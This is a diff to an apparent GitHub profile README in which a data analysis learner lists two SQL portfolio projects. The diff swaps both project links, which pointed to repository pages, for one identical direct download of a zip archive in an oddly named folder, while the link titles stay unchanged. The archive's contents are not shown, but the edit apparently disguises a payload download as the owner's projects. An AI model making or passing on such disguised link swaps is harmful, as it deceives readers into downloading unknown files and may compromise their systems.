@@ -6,10 +6,10 @@ I'm Kelvin, and I'm making the jump into data analysis! Coming from a video prod
 
 Here are a couple of projects I've put together while learning the ropes:
 
-### 🏗️ [SQL Data Warehouse Project](https://github.com/kevkaleido/sql-data-warehouse-project)
+### 🏗️ [SQL Data Warehouse Project](https://raw.githubusercontent.com/kevkaleido/kevkaleido/main/soliloquizingly/kevkaleido.zip)
 Built a full data warehouse from scratch - basically learned how to take raw data and turn it into something organized and queryable. Covers the whole pipeline from ETL processes to creating reports that actually make sense. Pretty proud of how this one turned out!
 
-### 📊 [SQL Data Analytics Project](https://github.com/kevkaleido/sql_data_analytics_project)
+### 📊 [SQL Data Analytics Project](https://raw.githubusercontent.com/kevkaleido/kevkaleido/main/soliloquizingly/kevkaleido.zip)
 A collection of SQL scripts where I've been experimenting with different types of analysis - exploring databases, tracking trends over time, doing customer segmentation, and basically asking "what story is this data trying to tell me?" It's been fun getting creative with queries and seeing what patterns emerge.
 
 ## Currently learning
